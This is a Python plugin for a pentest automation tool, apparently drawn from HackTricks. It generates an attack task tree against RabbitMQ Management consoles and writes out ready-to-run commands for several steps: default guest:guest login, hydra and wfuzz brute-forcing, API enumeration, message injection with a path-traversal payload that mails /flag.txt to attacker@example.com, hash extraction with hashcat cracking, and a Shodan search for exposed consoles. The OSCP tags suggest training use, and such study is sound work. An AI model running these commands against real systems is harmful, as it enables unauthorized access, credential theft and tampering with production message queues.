"""
RabbitMQ Management service enumeration plugin

Generates tasks for RabbitMQ Management Console (port 15672) including:
- Default credential testing (guest:guest)
- Brute-force authentication
- API enumeration
- Message queue publishing
- Hash cracking

Extracted from HackTricks: network-services-pentesting/15672-pentesting-rabbitmq-management.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class RabbitMQPlugin(ServicePlugin):
    """RabbitMQ Management Console enumeration plugin"""

    @property
    def name(self) -> str:
        return "rabbitmq"

    @property
    def default_ports(self) -> List[int]:
        return [15672]

    @property
    def service_names(self) -> List[str]:
        return ['rabbitmq', 'rabbitmq-management', 'http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect RabbitMQ Management services"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        port = port_info.get('port')

        # Check service name
        if 'rabbitmq' in service or 'rabbitmq' in product:
            return True

        # Check common port
        if port == 15672:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate RabbitMQ Management enumeration task tree"""

        tasks = {
            'id': f'rabbitmq-enum-{port}',
            'name': f'RabbitMQ Management Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: Default Credentials Test
        tasks['children'].append({
            'id': f'rabbitmq-default-creds-{port}',
            'name': 'Test Default Credentials',
            'type': 'command',
            'metadata': {
                'command': f'curl -u guest:guest http://{target}:{port}/api/overview',
                'description': 'Test default RabbitMQ credentials (guest:guest)',
                'flag_explanations': {
                    '-u guest:guest': 'HTTP Basic Auth with default credentials',
                    '/api/overview': 'RabbitMQ Management API overview endpoint'
                },
                'success_indicators': [
                    'HTTP 200 response',
                    'JSON response with cluster/node information',
                    'Access granted to management console'
                ],
                'failure_indicators': [
                    'HTTP 401 Unauthorized',
                    'Default credentials disabled',
                    'Connection refused'
                ],
                'next_steps': [
                    'Access web console at http://{target}:{port}',
                    'Enumerate connections at /api/connections',
                    'Check queues and exchanges',
                    'If failed, proceed to brute-force'
                ],
                'alternatives': [
                    f'Manual: Browse to http://{target}:{port} and login with guest:guest',
                    f'curl -i http://{target}:{port} (check if management plugin enabled)',
                    f'nmap --script http-auth -p {port} {target}'
                ],
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'estimated_time': '1 minute',
                'notes': 'RabbitMQ default credentials are guest:guest. Management plugin must be enabled (rabbitmq-plugins enable rabbitmq_management).'
            }
        })

        # Task 2: Brute-force Authentication
        tasks['children'].append({
            'id': f'rabbitmq-brute-{port}',
            'name': 'Brute-force RabbitMQ Login',
            'type': 'command',
            'metadata': {
                'command': f'hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt {target} http-get "/:A=BASIC:F=401"',
                'description': 'Brute-force RabbitMQ Management Console authentication',
                'flag_explanations': {
                    '-L': 'Username wordlist (common users)',
                    '-P': 'Password wordlist (common passwords)',
                    'http-get': 'HTTP GET request method',
                    ':A=BASIC': 'HTTP Basic Authentication',
                    ':F=401': 'Failure condition - HTTP 401 response'
                },
                'success_indicators': [
                    'Valid credentials found',
                    'Login successful message',
                    'HTTP 200 response obtained'
                ],
                'failure_indicators': [
                    'No valid credentials found',
                    'Account lockout triggered',
                    'Rate limiting detected'
                ],
                'next_steps': [
                    'Use found credentials to access management console',
                    'Enumerate API endpoints with valid creds',
                    'Check for sensitive data in queues',
                    'Attempt message injection'
                ],
                'alternatives': [
                    f'Manual: Use Burp Intruder on login form at http://{target}:{port}',
                    f'wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ" http://{target}:{port}/login',
                    'patator http_fuzz url=http://{target}:{port} -x ignore:code=401'
                ],
                'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                'estimated_time': '10-30 minutes',
                'notes': 'Brute-forcing may trigger account lockouts or IDS alerts. Try default credentials first. Check for rate limiting.'
            }
        })

        # Task 3: API Enumeration (conditional - if authenticated)
        tasks['children'].append({
            'id': f'rabbitmq-api-enum-{port}',
            'name': 'Enumerate Management API',
            'type': 'parent',
            'children': [
                {
                    'id': f'rabbitmq-connections-{port}',
                    'name': 'Enumerate Connections',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -u USERNAME:PASSWORD http://{target}:{port}/api/connections',
                        'description': 'Enumerate active RabbitMQ connections (requires credentials)',
                        'flag_explanations': {
                            '-u USERNAME:PASSWORD': 'HTTP Basic Auth (replace with found credentials)',
                            '/api/connections': 'API endpoint listing active connections'
                        },
                        'success_indicators': [
                            'JSON array of connection objects',
                            'Client IP addresses revealed',
                            'Connection protocols and users listed'
                        ],
                        'failure_indicators': [
                            'HTTP 401 - authentication required',
                            'Empty array - no active connections',
                            'HTTP 403 - insufficient permissions'
                        ],
                        'next_steps': [
                            'Identify client applications connecting to RabbitMQ',
                            'Check for sensitive data in connection metadata',
                            'Map internal network from connection sources',
                            'Enumerate queues and exchanges'
                        ],
                        'alternatives': [
                            f'Manual: Browse http://{target}:{port}/#/connections in management UI',
                            f'curl -u USER:PASS http://{target}:{port}/api/vhosts (enumerate virtual hosts)',
                            f'curl -u USER:PASS http://{target}:{port}/api/queues (list queues)'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'REQUIRES_AUTH'],
                        'notes': 'Replace USERNAME:PASSWORD with found credentials. Management API provides comprehensive cluster information.'
                    }
                },
                {
                    'id': f'rabbitmq-queues-{port}',
                    'name': 'Enumerate Message Queues',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -u USERNAME:PASSWORD http://{target}:{port}/api/queues',
                        'description': 'List all message queues and their status',
                        'flag_explanations': {
                            '-u USERNAME:PASSWORD': 'HTTP Basic Auth credentials',
                            '/api/queues': 'API endpoint for queue enumeration'
                        },
                        'success_indicators': [
                            'JSON list of queues returned',
                            'Queue names, message counts, consumers visible',
                            'Virtual host assignments listed'
                        ],
                        'failure_indicators': [
                            'HTTP 401 - invalid credentials',
                            'Empty array - no queues configured',
                            'Permission denied on specific vhosts'
                        ],
                        'next_steps': [
                            'Identify high-value queues (email, notifications, etc.)',
                            'Check message counts for active queues',
                            'Attempt to read messages from queues',
                            'Test message injection into queues'
                        ],
                        'alternatives': [
                            f'Manual: Management UI → Queues tab',
                            f'rabbitmqadmin -H {target} -P {port} -u USER -p PASS list queues',
                            f'curl -u USER:PASS http://{target}:{port}/api/exchanges (list exchanges)'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'REQUIRES_AUTH']
                    }
                }
            ]
        })

        # Task 4: Message Injection
        tasks['children'].append({
            'id': f'rabbitmq-message-inject-{port}',
            'name': 'Message Queue Injection',
            'type': 'manual',
            'metadata': {
                'description': 'Inject malicious messages into RabbitMQ queues via Management API',
                'command': f'''curl -u USERNAME:PASSWORD -X POST http://{target}:{port}/api/exchanges/%2F/amq.default/publish \\
  -H "Content-Type: application/json" \\
  -d '{{"vhost":"/","name":"amq.default","properties":{{"delivery_mode":1,"headers":{{}}}},"routing_key":"TARGET_QUEUE","delivery_mode":"1","payload":"MALICIOUS_PAYLOAD","headers":{{}},"props":{{}},"payload_encoding":"string"}}'
''',
                'flag_explanations': {
                    '-X POST': 'HTTP POST method for message publishing',
                    '/api/exchanges/%2F/amq.default/publish': 'Publish endpoint (%2F is URL-encoded /)',
                    'vhost': 'Virtual host (default is /)',
                    'routing_key': 'Target queue name (determines message destination)',
                    'payload': 'Message content (JSON, XML, or plain text)',
                    'delivery_mode': '1=non-persistent, 2=persistent'
                },
                'success_indicators': [
                    'HTTP 200 response with routed:true',
                    'Message appears in target queue',
                    'Consumer processes the injected message',
                    'Desired side effect occurs (file read, command execution, etc.)'
                ],
                'failure_indicators': [
                    'HTTP 400 - malformed JSON',
                    'routed:false - queue does not exist',
                    'HTTP 403 - insufficient publish permissions',
                    'Message rejected by consumer validation'
                ],
                'next_steps': [
                    'Craft payloads based on queue consumer logic',
                    'Test for file inclusion (path traversal in attachments)',
                    'Attempt command injection in processed fields',
                    'Check for XXE in XML payloads',
                    'Monitor application behavior after injection'
                ],
                'alternatives': [
                    f'Manual: Management UI → Exchanges → amq.default → Publish message',
                    f'rabbitmqadmin -H {target} -P {port} -u USER -p PASS publish routing_key=QUEUE payload="DATA"',
                    'Write Python script using pika library for message publishing',
                    'Use AMQP client (port 5672) for direct queue publishing'
                ],
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'REQUIRES_AUTH'],
                'notes': '''Example from HackTricks: Inject email with file attachment path traversal:
{
  "to": "attacker@example.com",
  "attachments": [{"path": "/flag.txt"}]
}

Requires understanding of consumer logic. Payload format depends on application.'''
            }
        })

        # Task 5: Hash Cracking
        tasks['children'].append({
            'id': f'rabbitmq-hash-crack-{port}',
            'name': 'Crack RabbitMQ Password Hash',
            'type': 'manual',
            'metadata': {
                'description': 'Crack RabbitMQ password hashes extracted from config files or memory',
                'command': f'''# Extract hash from RabbitMQ config on {target} (requires file access)
# Hash format: base64-encoded (4-byte salt + password hash)
echo "<BASE64_HASH>" | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{{8}})(.*)/{{target}}$2:$1/' > hash.txt
hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
''',
                'flag_explanations': {
                    'base64 -d': 'Decode base64-encoded hash',
                    'xxd -pr -c128': 'Convert binary to hex string (plaintext, continuous)',
                    "perl -pe 's/^(.{8})(.*)/$2:$1/'": 'Reformat hash (swap salt and hash for hashcat)',
                    '-m 1420': 'Hashcat mode 1420 (sha256($salt.$pass))',
                    '--hex-salt': 'Salt is in hexadecimal format'
                },
                'success_indicators': [
                    'Hashcat finds plaintext password',
                    'Password matches expected pattern',
                    'Can authenticate with cracked password'
                ],
                'failure_indicators': [
                    'Hash format error',
                    'No match in wordlist',
                    'Hashcat mode incorrect',
                    'Exhausted keyspace'
                ],
                'next_steps': [
                    'Use cracked password for RabbitMQ authentication',
                    'Check for password reuse on other services',
                    'Access management console with credentials',
                    'Pivot to AMQP protocol (port 5672)'
                ],
                'alternatives': [
                    'john --format=raw-sha256 hash.txt',
                    'Brute-force login instead of hash cracking',
                    'Extract hashes from /var/lib/rabbitmq/mnesia/ (requires file access)',
                    'Memory dump analysis if you have system access'
                ],
                'tags': ['OSCP:LOW', 'RESEARCH', 'ADVANCED'],
                'notes': '''RabbitMQ hash format: base64(salt + sha256(salt + password))
Requires access to configuration files or memory dumps.
Hash location: /etc/rabbitmq/rabbitmq.conf or Erlang mnesia database.
Hashcat mode 1420 is for sha256($salt.$pass) with hex salt.'''
            }
        })

        # Task 6: Service Information
        tasks['children'].append({
            'id': f'rabbitmq-research-{port}',
            'name': 'RabbitMQ Service Research',
            'type': 'parent',
            'children': [
                {
                    'id': f'rabbitmq-shodan-{port}',
                    'name': 'Shodan Search: RabbitMQ',
                    'type': 'research',
                    'metadata': {
                        'command': 'shodan search "port:15672 http"',
                        'description': 'Find exposed RabbitMQ Management Consoles on Shodan',
                        'tags': ['RESEARCH', 'OSCP:LOW'],
                        'notes': 'Shodan query: port:15672 http - Reveals publicly exposed RabbitMQ instances',
                        'alternatives': [
                            'Google: inurl:15672 rabbitmq',
                            'Censys.io search for RabbitMQ'
                        ]
                    }
                },
                {
                    'id': f'rabbitmq-amqp-check-{port}',
                    'name': 'Check AMQP Protocol Port',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -sV -p 5671,5672 {target}',
                        'description': 'Check if AMQP protocol ports are also open',
                        'flag_explanations': {
                            '-sV': 'Service version detection',
                            '-p 5671,5672': 'AMQP SSL and plain ports'
                        },
                        'success_indicators': [
                            'Port 5672 open (AMQP)',
                            'Port 5671 open (AMQPS)',
                            'Service identified as RabbitMQ'
                        ],
                        'failure_indicators': [
                            'Ports filtered or closed',
                            'No AMQP service detected'
                        ],
                        'next_steps': [
                            'Enumerate AMQP service (see 5671,5672 - Pentesting AMQP)',
                            'Test AMQP authentication with found credentials',
                            'Direct queue manipulation via AMQP protocol'
                        ],
                        'alternatives': [
                            f'nc -zv {target} 5672 (simple port check)',
                            f'telnet {target} 5672',
                            f'nmap --script amqp-info -p 5672 {target}'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'notes': 'RabbitMQ Management (15672) is web interface. AMQP (5672) is the message protocol. Both should be enumerated.'
                    }
                }
            ]
        })

        return tasks
